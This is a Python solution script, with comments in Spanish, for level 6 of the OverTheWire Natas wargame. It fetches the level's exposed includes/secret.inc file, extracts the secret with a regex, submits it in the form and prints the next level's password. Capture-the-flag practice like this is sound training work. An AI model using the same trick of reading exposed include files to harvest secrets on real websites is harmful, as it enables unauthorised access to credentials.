#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:ts=4:sw=4:et:ft=python:
"""
natas06.py

el presunto codigo fuente de la pagina muestra que el formulario de validacion necesita el valor 
que aparece en includes/secret.inc
"""
import sys
import re
import sys
import libnatas

# url: "http://natas6.natas.labs.overthewire.org"
# user: "natas6"
password = sys.argv[1]

natas = libnatas.NatasBrowser(level=6, password=password)

# de index-source.html se obtiene la url al script que valida la password
# el $secret esta en la siguiente url
script = 'includes/secret.inc'
soup = natas.get_html_soup(natas.level_url + '/' + script)

# regex para extraer la password:
regex1 = re.compile('.*"(.*)".*')
secret = regex1.findall(soup.prettify())[0]
#print secret

# reabrimos la pagina principal y rellenamos el formulario
natas.open(natas.level_url)
natas.select_form(nr=0) # primera form (y unica)
natas.form['secret'] = secret

html = natas.submit()
password_nl = natas.get_password(html.read(), '.*natas7 is (.*)\W.*')
natas.print_password(password_nl)
